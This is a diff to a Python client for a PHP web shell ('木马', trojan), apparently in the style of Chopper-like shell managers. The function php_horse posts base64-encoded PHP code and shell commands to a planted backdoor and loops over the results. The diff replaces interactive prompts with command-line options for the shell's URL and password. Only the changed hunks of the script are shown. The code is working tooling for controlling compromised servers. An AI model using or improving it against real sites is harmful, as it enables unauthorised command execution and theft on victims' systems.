@@ -1,4 +1,10 @@
 import requests
+from optparse import OptionParser
+use="Usage: Python <filename> -u <url> -p <passwd>"
+optParser = OptionParser(usage=use)
+optParser.add_option('-u','--url',action='store',type = "string" ,default=False,dest = 'url',help='Enter the url here')
+optParser.add_option('-p','--passwd',action='store',type = "string" ,default=False,dest = 'passwd',help='Enter the file password here')
+options,args = optParser.parse_args()
 header = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36'}
 def base64(tstr):
 	import base64
@@ -32,16 +38,23 @@ def php_horse(url,parameter,header,pa=""):
 	#tphp为base64编码后的字符串
 	r=requests.post(url,data={parameter:zaphp,'z0':zbphp,'z1':linux_shell,'z2':command.decode('utf-8')},headers=header)
 	result=regularex(r.text)
+	#print(result)
 	for i in range(len(result)-3):
-		print (result[i]+" ",end="")
+		if result[i] =='':
+			continue
+		print (result[i])
 	return result[-3]
-url=str(input("木马url: "))
-parameter=str(input("木马参数: "))
-pa=php_horse(url,parameter,header) #pa为路径判断所需函数
-while True:
-	if pa=="exit":
-		break
-	elif pa!="":
-		pa=php_horse(url,parameter,header,pa=pa)
+
+if options.url!=False and options.passwd!=False:
+	url=options.url
+	parameter=options.passwd
+	pa=php_horse(url,parameter,header) #pa为路径判断所需函数
+	while True:
+		if pa=="exit":
+			break
+		elif pa!="":
+			pa=php_horse(url,parameter,header,pa=pa)
+else:
+	print("Usage: Python <filename> -u <url> -p <passwd>")
 
 
